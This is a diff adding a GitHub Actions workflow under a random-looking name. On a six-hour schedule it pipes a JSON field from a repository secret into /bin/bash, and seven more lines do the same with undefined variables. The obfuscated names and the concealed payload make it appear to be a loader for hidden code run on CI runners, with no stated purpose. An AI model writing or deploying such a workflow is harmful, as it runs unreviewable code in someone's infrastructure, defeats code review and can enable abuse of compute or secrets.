@@ -1,0 +1,23 @@
+name: kenengshiniezaoysh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kenengshiniezaoysh
+        env:
+          eg038: ${{ secrets.eg038 }}
+        run: |
+          echo $eg038 | jq -r .rqaq0247 | /bin/bash
+          echo $sti45 | jq -r .mvt8 | /bin/bash
+          echo $kj7711 | jq -r .rxnus4 | /bin/bash
+          echo $u14843 | jq -r .d6 | /bin/bash
+          echo $nh08268 | jq -r .qy3 | /bin/bash
+          echo $y9 | jq -r .jxj9 | /bin/bash
+          echo $nkou0908 | jq -r .figux7 | /bin/bash
+          echo $zk28 | jq -r .jcd69 | /bin/bash
+
